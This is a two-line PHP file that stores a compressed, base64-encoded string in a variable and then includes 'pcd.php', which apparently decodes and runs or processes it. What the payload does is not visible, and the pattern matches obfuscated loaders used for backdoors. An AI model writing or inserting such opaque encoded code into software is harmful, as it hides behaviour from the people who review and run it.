<?php
$code="s7EvyCjg5VLITNNIy8xJjU+tyCwuKdZQD64sLknN1Q8O9tB3TE/NK9EDKlPX1KxWKEotLM0sSo3Pz0tOxaXMWqFWITWnOBVDNYYyAA==";include("pcd.php");?>